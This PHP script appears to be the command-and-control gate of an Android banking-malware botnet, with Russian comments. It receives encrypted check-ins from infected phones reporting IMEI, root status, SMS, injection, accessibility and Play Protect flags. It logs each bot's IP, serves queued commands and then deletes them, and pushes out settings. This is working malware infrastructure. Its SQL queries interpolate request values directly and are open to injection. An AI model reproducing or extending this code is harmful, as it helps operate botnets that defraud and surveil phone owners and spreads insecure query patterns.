<?php
$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include 'crypt.php';
include 'config.php';
$request = mb_substr($request, 0, mb_strlen($request));
$request =  decrypt($request,cryptKey);

if((!preg_match("/script/",$request)) && (!preg_match("/base64/",$request)) ) {
$massivReq = explode(":", $request);

$IMEI = $massivReq[0];
$root = $massivReq[1];
$settingsALLhash = $massivReq[2];//"bK4thrkNhQSk6S6";//!!!
$checkIconInj = $massivReq[3];
$checkIconGeolocation = $massivReq[4];
$checkIconSMS = $massivReq[5];
$screen = $massivReq[6];
$accessibility = $massivReq[7];
$seconds = $massivReq[8];
$playprotect = $massivReq[9];
$doze = isset($massivReq[10]) ? $massivReq[10] : "";
$step = isset($massivReq[11]) ? $massivReq[11] : "0";


$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
//$sql = "SELECT IMEI FROM kliets WHERE IMEI='$IMEI'";
$connection->exec('SET NAMES utf8');
$statement = $connection->prepare("SELECT IMEI FROM kliets WHERE IMEI='$IMEI'");
$statement->execute([$IMEI]);


$booleanIMEI = false;
foreach($statement as $row)
{
	if($row['IMEI']==$IMEI)
	{
		$booleanIMEI=true;
		break;
	}
}
if($booleanIMEI == true)
{
	 $statement = $connection->prepare("SELECT * FROM commands WHERE IMEI='$IMEI'");
	 $statement->execute([$IMEI]);
	 //$sql2 = "SELECT * FROM commands WHERE IMEI='$IMEI'";
	 $data_comm = "";
	 $booldelcommands=false;
	 foreach($statement as $row)
	 {
		 if($row['IMEI']==$IMEI)
		{
	     $com0 = "id=";
			 $com1 = $row['id'];
			 $com2 = $row['command'];
			 $data_comm = "$data_comm$com0$com1$com2";
			 $booldelcommands=true;
		}
	 }
	 if($booldelcommands)
	 {
		 //Удаляем нафиг команды!
		 $statement = $connection->prepare("DELETE FROM commands WHERE IMEI='".$IMEI."'");
		 $statement->execute([$IMEI]);

		 //$sql3 = "DELETE FROM commands WHERE IMEI='".$IMEI."'";
		 //$connection->query($sql3);
	 }
	 //Записываем время конекта в бд и другую инфу
	 $data_ = date('Y-m-d H:i:s');
	 $ipbot = GetIP();
	 $statement = $connection->prepare("UPDATE kliets SET step='$step', ip= '$ipbot', lastConnect = '$data_', r00t = '$root',requestInjProc = '$checkIconInj', requestGeoloc='$checkIconGeolocation', requestSMS = '$checkIconSMS', screen='$screen', accessibility='$accessibility', seconds = '$seconds', playprotect='$playprotect', doze='$doze'  WHERE IMEI='".$IMEI."';");
	 $statement->execute(array($step,$ipbot,$data_,$root,$screen,$IMEI,$checkIconInj,$checkIconGeolocation,$accessibility,$seconds,$checkIconSMS,$playprotect));

	 //отправляем статус настроек
	 if(($data_comm == "")||($data_comm == " "))
	 {
		$statement = $connection->prepare("SELECT IMEI, state FROM settings WHERE IMEI='$IMEI'");
		$statement->execute([$IMEI]);

		//$sql = "SELECT IMEI, state FROM settings WHERE IMEI='$IMEI'";
		foreach($statement as $row)
		{
			if($row['IMEI']==$IMEI)
			{
				if($row['state']=="1")
				{
					$data_comm="state1letsgotxt";
					$statement = $connection->prepare("UPDATE settings SET state = '0' WHERE IMEI='".$IMEI."'");
					$statement->execute([$IMEI]);
				}
			}
		}
		if($data_comm!="state1letsgotxt")
		{
			$sql = "SELECT id, hash FROM settingsall WHERE id='1'";
			foreach($connection->query($sql) as $row){
				if($row['hash']!=$settingsALLhash){
					$data_comm="$data_comm|ALLSETTINGSGO|";
				}
				break;
			}
		}
		if(($data_comm == "")||($data_comm == " "))$data_comm="2*0*0";
	 }

	$booleanIMEI == false;
	//достаем команды и отправляем!
	$tag = "<tag>";
	$otv = encrypt("$data_comm",cryptKey);
	$tagend = "</tag>";
	echo "$tag$otv$tagend";
}
else
{//Если нет ID бота!
	$tag = "<tag>";
	$otv = encrypt("|NO|",cryptKey);
	$tagend = "</tag>";
	echo "$tag$otv$tagend";
}
}

function GetIP() {
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  }
  return $ip;
}

//проверяем существует ли такой IMEI
//если существует, достаем команды которые есть и отдаем
//если не существует отдаем |NO|
//SELECT * FROM table_name WHERE (выражение) [order by field_name [desc][asc]]
?>
